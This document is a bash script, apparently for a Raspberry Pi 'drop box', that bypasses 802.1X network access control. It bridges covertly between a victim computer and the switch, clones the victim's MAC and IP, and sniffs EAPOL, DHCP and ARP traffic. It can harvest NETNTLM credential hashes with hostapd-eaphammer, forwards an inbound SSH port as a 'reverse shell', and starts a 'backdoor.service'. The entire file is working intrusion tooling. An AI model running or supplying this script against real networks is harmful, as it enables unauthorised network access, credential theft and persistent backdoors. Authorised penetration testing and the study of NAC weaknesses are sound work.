#!/bin/bash

#set -xe

if [ -z "$1" ]
  then
    echo "No argument supplied"
    exit 1;
fi

# Global Vars - ADD TO SOURCE FILE
#GWMAC="00:de:ad:be:ef:00"
#GWMAC="Testing"
BRINT=br0 #bridge interface
SWINT=eth1
SWMAC=$(ifconfig $SWINT | grep -i ether | awk '{ print $2 }') #get SWINT MAC address automatically.
COMPINT=eth0
BRIP=169.254.66.66 #IP for the bridge
WINT=wlan0 #Wireless interface running hostapd
WNET="192.168.19.0/24" #Wireless network block
DPORT=2222 #SSH CALL BACK PORT USE victimip:2222 to connect to attackerbox:22
RANGE=61000-62000 #Ports for my traffic on NAT
RUNAPD=0 #1 - yes steal creds, 0 - no, just don't
RUNWF=0 #1 - yes to set up wireless, 0 - no, just don't
HOSTAPDPATH="/opt/Drop-Pi/eaphammer/hostapd-eaphammer/hostapd/hostapd-eaphammer"
HOSTWIREDCONF="/opt//Drop-Pi/NacBypass2.0/hostapd-wired.conf"
RANDSTRING=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
EAPLOG="/opt/Drop-Pi/NacBypass2.0/logs/eapol-$RANDSTRING.pcap"
BOOTLOG="/opt/Drop-Pi/NacBypass2.0/logs/boot-$RANDSTRING.pcap"
ARPLOG="/opt/Drop-Pi/NacBypass2.0/logs/arp-$RANDSTRING.pcap"

ERR="Something is wrong"
ATTEM=0
TIMESL=0
DNZ=0

TRIGGERS="none"
#Random things for visual stimuli
HEARTB=$(modprobe ledtrig_heartbeat)
TIMEER=$(modprobe ledtrig_timer)

ErrNotifi() {
   echo $ERR
   echo timer > /sys/class/leds/led1/trigger
   echo 500 > /sys/class/leds/led1/delay_on
   echo 500 > /sys/class/leds/led1/delay_off
   sleep 10
   /opt/Drop-Pi/NacBypass2.0/NacBypass.sh down
   exit 0;
}

ProfitNotifi() {
   echo heartbeat > /sys/class/leds/led0/trigger
}

StealThyCreds() {
   echo "Running hostapd to try and harvest cred hashes"
   systemctl is-active --quiet dnsmasq.service && systemctl stop dnsmasq && DNZ=1 || echo "No dnsmasq running, carry on"
   DOWEGOTCREDS=`ifconfig $COMPINT up && timeout 20s $HOSTAPDPATH $HOSTWIREDCONF`
  # ethtool -r $COMPINT
  # /opt/NacBypass2.0/EAPolStart.py -c $COMPMAC -i $COMPINT
  # sleep 20
   ifconfig $COMPINT down
   echo $DOWEGOTCREDS | grep -q "NETNTLM" && echo "Got some NETNTLM creds, check logs. Here is output: $DOWEGOTCREDS" || echo "No creds moving on"
   if [ $DNZ -eq 1 ]; then
      echo "restarting dnsmasq, cause it was started for some reason and we stopped it..k"
      systemctl start dnsmasq.service
   fi
}

EAPOLMagic() {
    #if [ -e /tmp/eapol.pcap ]; then
    #   rm /tmp/eapol.pcap
    #fi
    
    echo "Listening for initial traffic"
    echo "Listening for intiial traffic" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
    ifconfig $COMPINT 0.0.0.0 up promisc && timeout 10s tcpdump -nne -i $COMPINT -c1 -w $EAPLOG && ifconfig $COMPINT down
    FILESIZEeap=$(wc -c < $EAPLOG)
    if [ $FILESIZEeap -gt 30 ]; then
      #Extracting the magic - just a mac address for the victim machine
      COMPMAC=`tcpdump -nne -c 1 -r $EAPLOG | awk '{print $2","$4$12}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
      if [ -z ${COMPMAC} ] ; then
         ERR="Well this is embarrassing, couldn't get client mac"
         ErrNotifi
      fi
      if [ $RUNAPD -eq 1 ]; then
         tcpdump -nne -c 1 -r $EAPLOG -i $COMPINT ether proto 0x888e | grep -q "EAPOL" && StealThyCreds || echo "We see no EAPol traffic, moving on"
      fi
      return 0
    else
      echo "Failed to get initial victim traffic, is the machine on? Are you on? Who am I?"
      echo "Failed to get initial victim traffic, is the machine on? Are you on? Who am I?/n" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
      ErrNotifi
    fi
}

InitialSetupEbtable() {
    echo "Constructing bridge"
    brctl addbr $BRINT #Make bridge
    brctl addif $BRINT $COMPINT #add computer side to bridge
    brctl addif $BRINT $SWINT #add switch side to bridge

    echo "Setting up Layer 2 rewrite"
    ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
    ebtables -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC

    echo "Enable EAP packet forwarding and bridge nf call"
    echo "Enable EAP packet forwarding and bridge nf call" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
    echo 8 > /sys/class/net/br0/bridge/group_fwd_mask #forward EAP packets
    MODPQ=$(modprobe br_netfilter)
    echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

    macchanger -r $BRINT #Swap MAC of bridge to an initialisation value (not important what)
    macchanger -m $SWMAC $BRINT #Swap MAC of bridge to the switch side MAC
    macchanger -r $COMPINT
    ifconfig $BRINT 0.0.0.0 up promisc #BRING UP BRIDGE

    echo "Bringing up the Bridge"
    echo "Bringing up the Bridge" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
}

DHCPSecretSquirrel() {
    if [ $ATTEM -le 2 ]; then
       #if [ -e /tmp/boot.pcap ]; then
       #   rm /tmp/boot.pcap
       #fi
       echo "Resetting Connection"
       echo "Resetting Connection " >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
       #mii-tool -r $COMPINT
       sleep $TIMESL
       ifconfig $SWINT 0.0.0.0 up promisc
       mii-tool -r $SWINT
       echo "Listening for Traffic"
       echo "Listening for Traffic" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
       ifconfig $COMPINT 0.0.0.0 up promisc && mii-tool -r $COMPINT && timeout 120s tcpdump -i $COMPINT -s0 -w $BOOTLOG -c1 dst port 68
       FILESIZE=$(wc -c < $BOOTLOG)
       if [ $FILESIZE -le 30 ]; then
           echo "PCAP empty, size: $FILESIZE"
           echo "PCAP empty, size: $FILESIZE" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           echo "Issue getting DHCP info, trying again - $ATTEM of 2"
           echo "Issue getting DHCP info, trying again - $ATTEM of 2" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           TIMESL=$((TIMESL+30))
           ATTEM=$((ATTEM+1))
           ifconfig $BRINT down && ifconfig $COMPINT down && ifconfig $SWINT down
           ifconfig $BRINT 0.0.0.0 up promisc #BRING UP BRIDGE
           DHCPSecretSquirrel
       else
           echo "Processing packet and setting veriables COMPMAC GWMAC COMIP"
           echo "Processing packet and setting veriables COMPMAC GWMAC COMIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           GWIP=`tcpdump -r $BOOTLOG -vvv -nne -s 0 -c 1 dst port 68 | grep "(3)" | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
           COMIP=`tcpdump -r $BOOTLOG -nne -c 1 dst port 68 | awk '{print $3","$4$12}' |cut -f 1-4 -d.| awk -F ',' '{print $3}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
           BROADCOMAC="NOT BROADCAST PACKET"
           if [ $COMIP == "255.255.255.255" ]; then
             BROADCOMAC=`tcpdump -r $BOOTLOG -vvv -nne -s 0 -c 1 dst port 68 | grep "Client-Ethernet-Address" | awk '{print $NF}' | grep -Eo '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
             if [ $BROADCOMAC == $COMPMAC ]; then
                COMIP=`tcpdump -r $BOOTLOG -vvv -nne -s 0 -c 1 dst port 68 | grep "Your-IP" | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
             else
                TIMESL=$((TIMESL+30))
                ATTEM=$((ATTEM+1))
                DHCPSecretSquirrel
             fi
           fi
           DNSSERV=`tcpdump -r $BOOTLOG -vvv -nne -s 0 -c 1 dst port 68 | grep "(6)" | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
	   while read -r line; do
               echo "nameserver $line" >> /etc/resolv.conf
           done <<< "$DNSSERV"
           echo "nameserver 8.8.8.8" >> /etc/resolv.conf
           echo "Gateway IP: $GWIP"
           echo "Gateway IP: $GWIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           echo "Bridge Interface: $BRINT"
           echo "Bridge Interface: $BRINT" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           echo "Getting MAC address for Gateway"
           echo "Getting MAC address for Gateway" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           ifconfig $COMPINT 0.0.0.0 up promisc &&  mii-tool -r $COMPINT && timeout 120s tcpdump -i $COMPINT -c1 -w $ARPLOG src host $GWIP and arp and arp[6:2] == 2
           GWMAC=`tcpdump -r $ARPLOG -vvv -nne -s 0 -c 1 arp and arp[6:2] == 2 | grep "0x0806" | grep "at" | cut -d " " -f 2 | awk '{print $NF}' | grep -m1 -Eo '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
           if [ -z ${GWMAC} ] ; then
            echo "Couldn't get Gateway mac via packet capture, falling back to arping the gateway. Thanks for making me add this extra step Doug, jerk"
            echo "Couldn't get Gateway mac via packet capture, falling back to arping the gateway. Thanks for making me add this extra step Doug, jerk" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
            echo "Arping the gateway, this may take a second..."
            echo "Arping the gateway, this may take a second..." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
            GWMAC=`arping -r -S $COMIP -i $BRINT $GWIP | grep -m1 -Eo '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
           fi
           if [ -z ${GWMAC} ] ; then
            ERR="Well this is embarrassing, couldn't get Gateway mac"
            ErrNotifi
           fi
           echo "Got the GateWay MAC = $GWMAC"
           echo "Got the GateWay MAC = $GWMAC" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           echo "Gateway IP: $GWIP"
           echo "Gateway IP: $GWIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           echo "Gateway MAC: $GWMAC"
           echo "Gateway MAC: $GWMAC" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           echo "Victim IP: $COMIP"
           echo "Victim IP: $COMIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           echo "Victim MAC: $COMPMAC"
           echo "Victim MAC: $COMPMAC" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           echo "DNS Server: $DNSSERV"
           echo "DNS Server: $DNSSERV" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           echo "Debug purposes: $BROADCOMAC"
           echo "Debug purposes: $BROADCOMAC" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
           
           return 0
       fi
    else
      ERR="tcpdump failed to capture DHCP traffic"
      ErrNotifi
    fi
}

CheckWireless() {
    if [[ ! -d /sys/class/net/$WINT ]]; then
        return 1
    else
        [[ $(</sys/class/net/$WINT/operstate) == up ]]
    fi
}

GoGoNacBypass() {
    echo none > /sys/class/leds/led1/trigger
    echo timer > /sys/class/leds/led0/trigger
    echo 300 > /sys/class/leds/led0/delay_on
    echo 300 > /sys/class/leds/led0/delay_off
    echo "" > /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
    echo "laying the ground work"
    echo "laying the ground work" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
    echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
    sysctl -p
    echo "" > /etc/resolv.conf

    EAPOLMagic
    InitialSetupEbtable
    DHCPSecretSquirrel
    if [ -z ${GWMAC} ] || [ -z ${COMIP} ]; then
      ERR="There was an issue getting the GWMAC or COMIP from tcpdump, you should probably run now"
      ErrNotifi
    else
      ifconfig $BRINT $BRIP up promisc

      # Create default routes so we can route traffic - all traffic goes to 169.254.66.1 and this traffic gets Layer 2 sent to GWMAC
      echo "Adding default routes"
      echo "Adding default routes " >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
      arp -s -i $BRINT 169.254.66.1 $GWMAC
      route add default gw 169.254.66.1

      #SSH CALLBACK if we receieve inbound on br0 for VICTIMIP:DPORT forward to BRIP on 22 (SSH)
      echo "Setting up SSH reverse shell inbound on VICTIMIP:2222 to ATTACKERIP:22"
      echo "Setting up SSH reverse shell inbound on VICTIMIP:2222 to ATTACKERIP:22" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
      iptables -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT -j DNAT --to $BRIP:22

      echo "Setting up Layer 3 rewrite rules"
      echo "Setting up Layer 3 rewrite rules" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log

      #Anything on any protocol leaving OS on BRINT with BRIP rewrite it to COMPIP and give it a port in the range for NAT
      iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
      iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
      iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

      if [ $RUNWF -eq 1 ]; then
      	#Check if wireless ap is running, if it is route all traffic over bridge with snat
      	#if CheckWireless; then
      	#     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p tcp -j SNAT --to $COMIP:$RANGE
      	#     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p udp -j SNAT --to $COMIP:$RANGE
      	#     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p icmp -j SNAT --to $COMIP
      	#     echo 1 > /proc/sys/net/ipv4/ip_forward
      	#fi
      	#echo "Creating route for WIFI dualhomed access to internet."
      	#echo "Creating route for WIFI dualhomed access to internet." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
      fi
      echo "Creating route for all internal network traffic."
      echo "Creating route for all internal network traffic." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log


      echo "Time for fun & profit"
      echo "Time for fun & profit" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
      echo "Starting backdoor service"
      echo "Starting backdoor service" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log

      if [ $RUNWF -eq 1 ]; then
	      echo "Bringing up WLAN0"
      	echo "Bringing up WLAN0" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
      	systemctl enable NetworkManager
      	sleep 10
      	systemctl start NetworkManager
      	sleep 10
      	WLANGWIP=`route | grep wlan0 | grep default | cut -d "0" -f 1 | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`

      	echo "Grabbing the WIFI Default GW IP: $WLANGWIP "
      	echo "Grabbing the WIFI Default GW IP: $WLANGWIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
      	sleep 20
      	#ip route add 66.42.94.137/32 via $WLANGWIP dev wlan0
      fi
      systemctl start backdoor.service
      ProfitNotifi
   fi
}

case "$1" in
  up)
    BRSTAT=`ifplugstatus | grep -oE $BRINT`
    if [ -z ${BRSTAT} ]; then
      GoGoNacBypass
    else
      echo "$BRINT is already present, not gonna do it."
      echo " You should clear that out if you are trying to start a new job."
      echo " Might I suggest running 'NacBypass.sh down'?"
      exit 0;
    fi
  ;;
  check_up)
   BRSTAT=`ifplugstatus | grep -oE $BRINT`
    if [ -z ${BRSTAT} ]; then
      echo "$BRINT is not present, going to flush everything."
      echo " If this is what you wanted, GREAT. If not...OMG."
      /opt/NacBypass2.0/NacBypass.sh down
    else
      echo "$COMPINT is down, $BRINT is still present. Leaving $BRINT up for now."
      echo " If you wanted to start a new job, run 'NacBypass.sh down'."
      exit 0;
    fi
  ;;
  down)
    echo $TRIGGERS > /sys/class/leds/led0/trigger
    echo $TRIGGERS > /sys/class/leds/led1/trigger
    # Flush iptable rules
    echo "Flushing iptable rules"
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    iptables -t nat -F
    iptables -t mangle -F
    iptables -F
    iptables -X

    # Flush ebtable rules
    echo "Flushing ebtable roules"
    for p in INPUT FORWARD OUTPUT
    do
      echo "Accepting $p"
      ebtables -P $p ACCEPT
    done
    for T in filter nat broute
    do
      echo "Flushing and deleting $T..."
      ebtables -t $T -F
      ebtables -t $T -X
    done

    # Removing routes
    echo "Removing routes"
    ROOOUUT=`route del default gw 169.254.66.1`
    ARRRP=`arp -d -i $BRINT 169.254.66.1 $GWMAC`

    ifconfig $SWINT down
    ifconfig $COMPINT down && ifconfig $COMPINT up

    #Remove bridge
    echo "Removing bridge"
    BRSTAT=`ifplugstatus | grep -oE $BRINT`
    if [ -z ${BRSTAT} ]; then
       echo "$BRINT is gone"
    else
       ifconfig $BRINT down
       brctl delif $BRINT $COMPINT
       brctl delif $BRINT $SWINT
       brctl delbr $BRINT
    fi
    if [ $RUNWF -eq 1 ]; then
    	echo "Bringing down WLAN0"
    	ifconfig wlan0 down
    	systemctl disable NetworkManager
    	systemctl stop NetworkManager
    fi
  ;;
esac
